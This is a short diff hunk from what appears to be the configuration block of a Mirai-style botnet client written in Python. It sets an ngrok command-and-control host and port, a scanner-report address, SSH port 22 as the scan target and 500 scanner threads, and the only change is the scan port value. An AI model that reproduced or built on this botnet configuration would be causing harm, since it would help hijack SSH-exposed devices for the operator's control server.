@@ -23,7 +23,7 @@ import base64 as b64
 cnc                  = "8.tcp.ngrok.io"#your cnc ip
 cport                = 13244#your cnc port
 scan_ip              = "127.0.0.1"#Recevie the scanned ip
-scan_port            = 911#same
+scan_port            = 606#same
 sport                = 22#Scanning port
 single_instance_port = 42026#You should knew this if u used mirai.
 scan_th              = 500#Scanner threads
